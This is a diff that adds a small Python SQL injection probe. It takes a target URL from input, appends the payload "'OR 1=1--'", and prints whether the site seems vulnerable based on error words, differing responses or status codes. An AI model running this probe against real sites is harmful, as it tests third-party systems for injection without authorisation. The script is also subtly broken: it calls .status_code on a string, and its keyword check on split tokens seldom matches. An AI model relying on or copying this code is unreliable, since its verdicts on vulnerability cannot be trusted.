@@ -1,0 +1,17 @@
+import requests
+url = input("Enter target URL : ")
+payload = "'OR 1=1--'"
+normal_Check = requests.get (url)
+normal_res = normal_Check.text
+vuln_url = url+payload
+vuln_res = requests.get(vuln_url)
+vuln_res = vuln_res. text
+sql_response = vuln_res.split()
+if "Warning:" in sql_response or "error" in sql_response or "MySQL" in sql_response:
+    print("It is vulnerable to SQL Injection")
+elif normal_res != vuln_res:
+    print ("May be vulnerable")
+elif vuln_res.status_code == 302 or vuln_res.status_code == 403:
+    print("Probably Vulnerable")
+else:
+    print("Not Vulnerable")
